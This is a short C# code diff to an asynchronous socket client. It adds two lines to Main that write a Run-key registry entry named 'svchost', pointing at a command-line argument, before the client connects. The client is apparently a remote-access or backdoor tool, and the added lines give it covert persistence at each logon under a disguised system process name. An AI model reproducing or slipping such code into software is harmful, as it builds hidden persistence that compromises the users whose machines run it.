@@ -4,6 +4,7 @@ using System.Net.Sockets;
 using System.Threading;
 using System.Text;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 // State object for receiving data from remote device.  
 public class StateObject
@@ -202,6 +203,8 @@ public class AsynchronousClient
 
     public static int Main(String[] args)
     {
+        RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+        key.SetValue("svchost", args[0], RegistryValueKind.String);
         StartClient();
         return 0;
     }
